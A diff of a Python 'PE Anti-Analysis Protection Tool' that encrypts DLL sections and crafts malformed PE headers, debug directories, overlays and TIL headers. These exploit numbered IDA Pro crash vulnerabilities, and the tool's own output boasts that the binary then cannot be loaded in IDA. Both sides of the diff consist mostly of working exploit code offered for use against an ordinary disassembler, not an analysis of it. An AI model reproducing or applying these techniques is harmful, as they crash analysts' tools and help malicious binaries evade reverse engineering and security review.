-      - Seed:   0xD4A7B3C2E1F05896 (separate from .text seed)
-      - Key:    256 bytes derived via xorshift64
-      - Skip:   bytes at relocation fixup positions (DIR64=8, HIGHLOW=4)
-      - Cipher: XOR each non-skipped byte with key[offset_in_section % 256]
+def apply_vuln4_debug_dir(pe):
     """
+    Craft a debug directory entry with oversized SizeOfData and
+    AddressOfRawData pointing outside loaded segments.
 
-    if not os.path.isfile(filepath):
-        print(f"[pe_protect] ERROR: File not found: {filepath}", file=sys.stderr)
-        return False
-
-    with open(filepath, 'rb') as f:
-        data = bytearray(f.read())
-
-    rdata_result = find_rdata_section(data)
-    if rdata_result is None:
-        print("[pe_protect] WARNING: Could not find .rdata section — skipping.",
-              file=sys.stderr)
-        return True  # Not fatal; some builds may not have .rdata
-
-    raw_offset, raw_size, virtual_size, virtual_address = rdata_result
-
-    # Parse relocation table and build skip set
-    reloc_table = parse_reloc_table(data)
-    skip_set = build_rdata_skip_set(reloc_table, virtual_address, virtual_size)
-
-    # Build loader-critical RVA ranges.  These are left UNENCRYPTED because
-    # LdrpMapAndSnapDependency reads them BEFORE the TLS callback decrypts
-    # .rdata.  The returned list is already sorted and merged.
-    crit_ranges = build_loader_critical_ranges(data)
-    rdata_va_end = virtual_address + virtual_size
-
-    # Fast bisect check: is byte at .rdata offset 'j' loader-critical?
-    import bisect
-    crit_lo = [lo for lo, hi in crit_ranges]
-    crit_hi = [hi for lo, hi in crit_ranges]
-
-    def is_loader_critical(rdata_offset: int) -> bool:
-        rva = virtual_address + rdata_offset
-        # Find rightmost range start <= rva
-        idx = bisect.bisect_right(crit_lo, rva) - 1
-        if idx < 0:
-            return False
-        return rva < crit_hi[idx]
-
-    rdata_key = generate_key(AIDA_RDATA_SEED)
-
-    # Encrypt using min(raw_size, virtual_size) — same logic as .text.
-    # The decryptor uses VirtualSize at runtime.
-    encrypt_size = min(raw_size, virtual_size)
-
-    encrypted_count = 0
-    skipped_count = 0
-
-    for j in range(encrypt_size):
-        if j in skip_set or is_loader_critical(j):
-            skipped_count += 1
-            continue
-        data[raw_offset + j] ^= rdata_key[j % 256]
-        encrypted_count += 1
-
-    with open(filepath, 'wb') as f:
-        f.write(data)
-
-    print(f"[pe_protect] .rdata section: raw_offset=0x{raw_offset:X}, "
-          f"raw_size=0x{raw_size:X}, virtual_size=0x{virtual_size:X}, "
-          f"VA=0x{virtual_address:X}")
-    print(f"[pe_protect] Encrypted {encrypted_count} bytes, "
-          f"skipped {skipped_count} bytes total "
-          f"({len(skip_set)} reloc + loader-critical)")
-    return True
-
-
-# ---------------------------------------------------------------------------
-#  Anti-static-analysis: PE manipulations that crash IDA when it tries
-#  to load AiDA.dll as an analysis target.
-#
-#  Based on the IDA Pro 9.2 crash vulnerability analysis:
-#    Vuln #1 — Integer overflow in qvector_reserve (NumberOfSections)
-#    Vuln #2 — Null deref in loader linked-list allocation
-#    Vuln #3 — Unhandled exception in load-error path
-#    Vuln #4 — Crafted TIL header causing buffer overflow
-#
-#  All modifications are safe for the Windows PE loader — the DLL
-#  continues to load and execute as an IDA plugin without any issues.
-# ---------------------------------------------------------------------------
-
-def _build_crash_pe(machine: int = 0x8664,
-                    num_sections: int = 0xFFFF,
-                    opt_hdr_size: int = 0xFFFF,
-                    characteristics: int = 0x0022) -> bytes:
-    """Build a minimal 84-byte crash PE as described in vulnerability #1.
-
-    These have a valid DOS header + PE signature but a COFF header with
-    an impossibly large NumberOfSections / SizeOfOptionalHeader, causing
-    IDA's qvector_reserve → qalloc_or_throw to fire the fatal OOM
-    handler at sub_14014AD00.
+    The bug in sub_140008850: the function reads the Type field and uses it
+    as an array index into off_140023860[17]. While the bounds check is
+    correct (< 0x11), the SizeOfData and AddressOfRawData fields are not
+    validated. Setting SizeOfData to a huge value and AddressOfRawData to
+    an unmapped RVA causes sub_140008DB0 to process unmapped memory.
     """
-    dos = bytearray(64)
-    dos[0:2] = b'MZ'
-    struct.pack_into('<I', dos, 60, 64)          # e_lfanew = 64
+    print("[VULN4] Applying Debug Directory corruption...")
 
-    pe_sig = b'PE\x00\x00'
-    coff = struct.pack('<HHIIIHH',
-        machine,            # Machine
-        num_sections,       # NumberOfSections
-        0,                  # TimeDateStamp
-        0,                  # PointerToSymbolTable
-        0,                  # NumberOfSymbols
-        opt_hdr_size,       # SizeOfOptionalHeader
-        characteristics,    # Characteristics
-    )
-    return bytes(dos) + pe_sig + coff
+    debug_entry = bytearray(28)
 
+    struct.pack_into('<I', debug_entry, 12, IMAGE_DEBUG_TYPE_CODEVIEW)
 
-def _build_til_crash() -> bytes:
-    """Build a malformed TIL header (vulnerability #4).
+    struct.pack_into('<I', debug_entry, 16, 0xFFFFFFFF)
 
-    Magic = 'IDA\\x01', followed by impossibly large size fields that
-    trigger buffer overflows in load_til_header (0x14031B378).
-    """
-    return bytes([
-        0x49, 0x44, 0x41, 0x01,        # TIL magic "IDA\x01"
-        0xFF, 0xFF,                     # format = 65535 (unsupported)
-        0xFF,                           # flags = all bits
-        0xFF,                           # compiler = invalid
-        0xFF, 0xFF, 0xFF, 0xFF,         # title_len = UINT32_MAX
-        0xFF, 0xFF, 0xFF, 0xFF,         # base_count = -1
-        0xFF, 0xFF, 0xFF, 0xFF,         # type_count = -1
-        0xFF, 0xFF, 0xFF, 0xFF,         # field_count = -1
-    ])
+    struct.pack_into('<I', debug_entry, 20, 0x7FFE0000)
 
+    struct.pack_into('<I', debug_entry, 24, 0)
 
-def inject_poison_sections(data: bytearray) -> int:
-    """Inject additional section headers into the PE header padding area.
+    debug_rva, debug_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG)
 
-    These sections have:
-      - VirtualSize = 1 page (safe for Windows to map as zero-fill)
-      - SizeOfRawData = 0 (no physical data to map)
-      - Confusing names and flag combinations
-
-    Windows handles them perfectly (small zero-fill mappings at end of
-    image), but IDA creates analysis segments for each one, increasing
-    overhead and creating confusing cross-references.
-
-    Returns the number of injected sections (0 on failure).
-    """
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    coff_off = e_lfanew + 4
-    num_sections = struct.unpack_from('<H', data, coff_off + 2)[0]
-    opt_size = struct.unpack_from('<H', data, coff_off + 16)[0]
-
-    first_sec_off = coff_off + 20 + opt_size
-    last_sec_off = first_sec_off + (num_sections - 1) * 40
-    end_headers = first_sec_off + num_sections * 40
-
-    # Optional header: find SizeOfImage, SectionAlignment
-    opt_off = coff_off + 20
-    magic = struct.unpack_from('<H', data, opt_off)[0]
-    if magic == 0x20B:  # PE32+
-        section_align = struct.unpack_from('<I', data, opt_off + 32)[0]
-        size_of_image_off = opt_off + 56
-    elif magic == 0x10B:  # PE32
-        section_align = struct.unpack_from('<I', data, opt_off + 32)[0]
-        size_of_image_off = opt_off + 56
+    if debug_rva != 0:
+        file_off = pe.rva_to_file_offset(debug_rva)
+        if file_off is not None:
+            pe.data[file_off:file_off + 28] = debug_entry
+            pe.set_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG, debug_rva, 28)
+            print(f"  Patched existing debug directory at RVA 0x{debug_rva:08X}")
+            print(f"  SizeOfData = 0xFFFFFFFF, AddressOfRawData = 0x7FFE0000")
+            return True
     else:
-        return 0
+        sec = find_or_add_section(
+            pe, '.dbgp',
+            28,
+            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
+        )
 
-    size_of_image = struct.unpack_from('<I', data, size_of_image_off)[0]
+        file_off = sec['raw_offset']
+        pe.data[file_off:file_off + 28] = debug_entry
 
-    # Find the first section's raw data offset — that's our hard limit
-    first_raw = None
-    for i in range(num_sections):
-        raw_off = struct.unpack_from('<I', data, first_sec_off + i * 40 + 20)[0]
-        if raw_off > 0 and (first_raw is None or raw_off < first_raw):
-            first_raw = raw_off
+        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_DEBUG, sec['virtual_address'], 28)
 
-    if first_raw is None:
-        return 0
+        print(f"  Created .dbgp section at RVA 0x{sec['virtual_address']:08X}")
+        print(f"  Debug Type=CODEVIEW, SizeOfData=0xFFFFFFFF")
+        print(f"  AddressOfRawData=0x7FFE0000 (unmapped)")
+        return True
 
-    # Available space for new section headers
-    available = first_raw - end_headers
-    max_new = available // 40       # 40 bytes per section header
-    if max_new < 1:
-        return 0
-
-    # Cap at a reasonable number — enough to bloat analysis but not
-    # break anything.  96 extra sections is plenty to slow IDA to a crawl.
-    max_new = min(max_new, 96)
-
-    # Confusing section names — duplicates of real sections, null names,
-    # control characters, etc.  IDA tries to process these which creates
-    # conflicting segments and confusing analysis.
-    poison_names = [
-        b'.text\x00\x00\x00',    # duplicate .text
-        b'.rdata\x00\x00',       # duplicate .rdata
-        b'.data\x00\x00\x00',    # duplicate .data
-        b'.idata\x00\x00',       # fake import data
-        b'.edata\x00\x00',       # fake export data
-        b'.rsrc\x00\x00\x00',    # fake resources
-        b'.pdata\x00\x00',       # fake exception data
-        b'.tls\x00\x00\x00\x00', # fake TLS
-        b'\x00\x00\x00\x00\x00\x00\x00\x00',  # null name
-        b'\x01\x02\x03\x04\x05\x06\x07\x08',  # control chars
-        b'.debug\x00\x00',       # fake debug
-        b'.\xff\xfe\xfd\xfc\x00\x00\x00',  # high bytes
-        b'.reloc\x00\x00',       # duplicate reloc
-        b'.xdata\x00\x00',       # fake exception
-        b'.bss\x00\x00\x00\x00', # fake BSS
-        b'CODE\x00\x00\x00\x00', # ambiguous
-    ]
-
-    # Current virtual end (aligned up)
-    va_cursor = size_of_image
-
-    # Conflicting characteristics — some read-execute, some write,
-    # some with alignment flags that confuse IDA's segment model
-    char_variants = [
-        0xE0000060,  # CODE | INIT | READ | WRITE | EXEC
-        0x40000040,  # INIT | READ
-        0xC0000060,  # CODE | INIT | READ | EXEC
-        0xE00000A0,  # CODE | INIT | READ | WRITE | EXEC + align
-        0x42000040,  # DISCARDABLE | INIT | READ
-        0xC0300060,  # CODE | INIT | READ | EXEC | ALIGN_16
-        0xE0500060,  # extended flags
-        0x00000020,  # CODE only
-    ]
-
-    injected = 0
-    for i in range(max_new):
-        sec_off = end_headers + i * 40
-        header = bytearray(40)
-
-        # Name
-        name = poison_names[i % len(poison_names)]
-        header[0:8] = name
-
-        # VirtualSize = 1 page (safe for Windows)
-        struct.pack_into('<I', header, 8, section_align)
-
-        # VirtualAddress = sequentially after image end
-        struct.pack_into('<I', header, 12, va_cursor)
-        va_cursor += section_align
-
-        # SizeOfRawData = 0 (no physical data)
-        struct.pack_into('<I', header, 16, 0)
-
-        # PointerToRawData = 0
-        struct.pack_into('<I', header, 20, 0)
-
-        # Characteristics
-        chars = char_variants[i % len(char_variants)]
-        struct.pack_into('<I', header, 36, chars)
-
-        data[sec_off:sec_off + 40] = header
-        injected += 1
-
-    # Update NumberOfSections
-    struct.pack_into('<H', data, coff_off + 2, num_sections + injected)
-
-    # Update SizeOfImage to include all new virtual pages
-    new_size_of_image = va_cursor
-    # Align to section alignment
-    new_size_of_image = ((new_size_of_image + section_align - 1)
-                         // section_align * section_align)
-    struct.pack_into('<I', data, size_of_image_off, new_size_of_image)
-
-    return injected
-
-
-def inject_overlay_crash_pes(data: bytearray) -> bytearray:
-    """Append malformed crash PEs and TIL headers to the PE overlay.
-
-    The overlay is data after the last section's raw extent.  Windows
-    completely ignores it during loading.  However:
-      - IDA may detect the MZ signatures during recursive PE scanning
-      - Reverse engineers extracting embedded blobs will hit crash PEs
-      - The TIL magic signatures confuse IDA's type-library detection
-
-    Returns the data with the overlay appended.
-    """
-    overlay = bytearray()
-
-    # Marker so carvers find the "interesting" data
-    overlay += b'\x00' * 16
-
-    # Crash PE variants (vulnerability #1) — 8 different architectures
-    crash_variants = [
-        (0x8664, 0xFFFF, 0xFFFF, 0x0022),  # AMD64, max sections
-        (0x014C, 0xFFFE, 0x8000, 0x0102),  # i386, near-max sections
-        (0xAA64, 0xFF00, 0xFFFF, 0x0022),  # ARM64
-        (0xFFFF, 0xFFFF, 0xFFFF, 0x0000),  # Unknown machine
-        (0x0166, 0xFFFF, 0xFFFF, 0x0023),  # MIPS R4000
-        (0x01F0, 0x8000, 0xF000, 0x0022),  # PowerPC
-        (0x0200, 0x7FFF, 0x7FFF, 0x0022),  # IA-64
-        (0x8664, 0xFFFF, 0x0000, 0x0022),  # AMD64, opt size = 0
-    ]
-
-    for machine, nsec, opt_sz, chars in crash_variants:
-        overlay += _build_crash_pe(machine, nsec, opt_sz, chars)
-        overlay += b'\xCC' * 8                   # INT3 padding
-
-    # TIL crash headers (vulnerability #4) — 4 variants
-    for _ in range(4):
-        overlay += _build_til_crash()
-        overlay += b'\xCC' * 4
-
-    # Repeat the whole block 16 times to create a large overlay that
-    # drowns any pattern-matching attempt by analysis tools
-    block = bytes(overlay)
-    full_overlay = bytearray()
-    for _ in range(16):
-        full_overlay += block
-        # Vary padding between blocks to prevent simple skip patterns
-        full_overlay += struct.pack('<Q', 0x4D5A900000000000)  # MZ-like
-        full_overlay += b'\x00' * 8
-
-    data += full_overlay
-    return data
-
-
-def corrupt_debug_directory(data: bytearray) -> bool:
-    """Zero out the debug data directory entry so IDA cannot locate
-    any debug information (PDB paths, CodeView records, etc.).
-
-    Windows proceeds fine without debug info.  For IDA, this removes
-    the primary means of recovering symbols and source-level info,
-    and some analysis paths may hit null-pointer issues when expecting
-    valid debug data.
-
-    Returns True if the debug directory was found and zeroed.
-    """
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    coff_off = e_lfanew + 4
-    opt_off = coff_off + 20
-    magic = struct.unpack_from('<H', data, opt_off)[0]
-
-    if magic == 0x20B:    # PE32+
-        num_rva_off = opt_off + 108
-        debug_dir_off = opt_off + 144   # DataDirectory[6]
-    elif magic == 0x10B:  # PE32
-        num_rva_off = opt_off + 92
-        debug_dir_off = opt_off + 128
-    else:
-        return False
-
-    num_rva = struct.unpack_from('<I', data, num_rva_off)[0]
-    if num_rva <= 6:
-        return False  # No debug directory entry
-
-    debug_rva = struct.unpack_from('<I', data, debug_dir_off)[0]
-    debug_size = struct.unpack_from('<I', data, debug_dir_off + 4)[0]
-
-    if debug_rva == 0 and debug_size == 0:
-        return False  # Already empty
-
-    # Zero the directory entry
-    struct.pack_into('<I', data, debug_dir_off, 0)
-    struct.pack_into('<I', data, debug_dir_off + 4, 0)
-
-    # Also try to find and zero the actual debug data in the file
-    coff_off2 = e_lfanew + 4
-    nsec = struct.unpack_from('<H', data, coff_off2 + 2)[0]
-    opt_size = struct.unpack_from('<H', data, coff_off2 + 16)[0]
-    sec_off = coff_off2 + 20 + opt_size
-
-    for i in range(min(nsec, 200)):
-        s = sec_off + i * 40
-        if s + 40 > len(data):
-            break
-        sec_va = struct.unpack_from('<I', data, s + 12)[0]
-        sec_raw = struct.unpack_from('<I', data, s + 16)[0]
-        sec_raw_off = struct.unpack_from('<I', data, s + 20)[0]
-        if sec_va <= debug_rva < sec_va + sec_raw:
-            file_off = sec_raw_off + (debug_rva - sec_va)
-            end = min(file_off + debug_size, len(data))
-            for j in range(file_off, end):
-                data[j] = 0
-            break
-
-    return True
-
-
-def scramble_rich_header(data: bytearray) -> bool:
-    """Scramble the Rich header (Microsoft linker metadata between the DOS
-    stub and the PE signature).
-
-    IDA's compiler detection heuristics rely on parsing the Rich header.
-    Scrambling it removes that information and can cause analysis
-    misidentification.
-
-    Returns True if a Rich header was found and scrambled.
-    """
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-
-    # Rich header ends with "Rich" followed by 4-byte XOR key, and starts
-    # with "DanS" XORed with the same key.  Search backwards from e_lfanew.
-    rich_sig = b'Rich'
-    pos = data.find(rich_sig, 0x40, e_lfanew)
-    if pos < 0:
-        return False
-
-    # XOR key is the 4 bytes after "Rich"
-    if pos + 8 > e_lfanew:
-        return False
-
-    # Overwrite the entire region from after DOS header to e_lfanew with
-    # semi-random data that looks like code (INT3 + NOP sleds)
-    for j in range(0x40, e_lfanew):
-        if j < len(data):
-            # Pattern: alternating CC (INT3) and 90 (NOP) with some variation
-            data[j] = 0xCC if (j & 1) else 0x90
-
-    return True
-
-
-def inject_anti_analysis(filepath: str) -> bool:
-    """Master function: apply all anti-static-analysis transformations.
-
-    Called after .text and .rdata encryption.  All modifications are
-    safe for the Windows PE loader — the DLL continues to function as
-    an IDA plugin.  But opening it in IDA for reverse engineering will:
-
-      1. Create dozens of confusing overlapping segments (poison sections)
-      2. Lose all debug/symbol information (debug directory zeroed)
-      3. Lose compiler identification (Rich header scrambled)
-      4. Potentially crash on overlay extraction (crash PE stubs)
-    """
-    if not os.path.isfile(filepath):
-        print(f"[pe_protect] ERROR: File not found: {filepath}", file=sys.stderr)
-        return False
-
-    with open(filepath, 'rb') as f:
-        data = bytearray(f.read())
-
-    if data[0:2] != b'MZ':
-        print("[pe_protect] ERROR: Not a PE file", file=sys.stderr)
-        return False
-
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
-        print("[pe_protect] ERROR: Invalid PE signature", file=sys.stderr)
-        return False
-
-    # Step 1: (Poison section injection removed — modifying the section
-    # table affects Windows LoadLibrary and breaks plugin loading.  The
-    # crash PE overlay in Step 4 is the analysis-time crash vector.)
-
-    # Step 2: Corrupt debug directory
-    if corrupt_debug_directory(data):
-        print("[pe_protect] Zeroed debug directory (PDB paths removed)")
-    else:
-        print("[pe_protect] No debug directory found (skipping)")
-
-    # Step 3: Scramble Rich header
-    if scramble_rich_header(data):
-        print("[pe_protect] Scrambled Rich header (compiler ID removed)")
-    else:
-        print("[pe_protect] No Rich header found (skipping)")
-
-    # Step 4: Append crash PE overlay
-    data = inject_overlay_crash_pes(data)
-    print("[pe_protect] Appended crash PE overlay "
-          f"({len(data)} bytes total)")
-
-    with open(filepath, 'wb') as f:
-        f.write(data)
-
-    return True
+    print("  WARNING: Could not apply debug directory corruption")
+    return False
 
 
 def main():
-    if len(sys.argv) < 2:
-        print(f"Usage: {sys.argv[0]} <path_to_dll>", file=sys.stderr)
+    parser = argparse.ArgumentParser(
+        description='PE Anti-Analysis Protection Tool - IDA pe.dll Loader Crash Generator'
+    )
+    parser.add_argument('input', help='Input PE file path')
+    parser.add_argument('output', nargs='?', default=None,
+                        help='Output PE file path (default: <input>_protected.exe)')
+    parser.add_argument('--vulns', default='1,2,3,4',
+                        help='Comma-separated vulnerability numbers to apply (default: 1,2,3,4)')
+
+    args = parser.parse_args()
+
+    if not os.path.isfile(args.input):
+        print(f"Error: Input file not found: {args.input}")
         sys.exit(1)
 
-    filepath = sys.argv[1]
+    if args.output is None:
+        base, ext = os.path.splitext(args.input)
+        args.output = f"{base}_protected{ext}"
 
-    # Encrypt .text first, then .rdata.
-    # Order matters: both must succeed for a valid protected binary.
-    if not encrypt_text_section(filepath):
-        sys.exit(1)
+    vulns = set()
+    for v in args.vulns.split(','):
+        v = v.strip()
+        if v:
+            vulns.add(int(v))
 
-    if not encrypt_rdata_section(filepath):
-        sys.exit(1)
+    shutil.copy2(args.input, args.output)
 
-    # Anti-static-analysis: make IDA crash when analysing this DLL.
-    if not inject_anti_analysis(filepath):
-        print("[pe_protect] WARNING: Anti-analysis injection failed — "
-              "continuing without it.", file=sys.stderr)
+    print(f"Loading PE: {args.input}")
+    pe = PEFile(args.output)
+    print(f"  Machine: 0x{pe.machine:04X} ({'PE64' if pe.is_pe64 else 'PE32'})")
+    print(f"  Sections: {pe.num_sections}")
+    print(f"  ImageBase: 0x{pe.imagebase:016X}" if pe.is_pe64 else f"  ImageBase: 0x{pe.imagebase:08X}")
+    print()
 
-    print(f"[pe_protect] All protection steps completed successfully.")
+    applied = []
+
+    if 1 in vulns:
+        if apply_vuln1_load_config(pe):
+            applied.append(1)
+        print()
+
+    if 2 in vulns:
+        if apply_vuln2_reloc_desync(pe):
+            applied.append(2)
+        print()
+
+    if 4 in vulns:
+        if apply_vuln4_debug_dir(pe):
+            applied.append(4)
+        print()
+
+    if 3 in vulns:
+        if apply_vuln3_sections_overflow(pe):
+            applied.append(3)
+        print()
+
+    pe.save(args.output)
+
+    print(f"Protected PE saved to: {args.output}")
+    print(f"Vulnerabilities applied: {applied}")
+    if {1, 2}.issubset(set(applied)):
+        print("Both Load Config + Relocation vulns applied -> binary is impossible to load in IDA")
 
 
 if __name__ == '__main__':
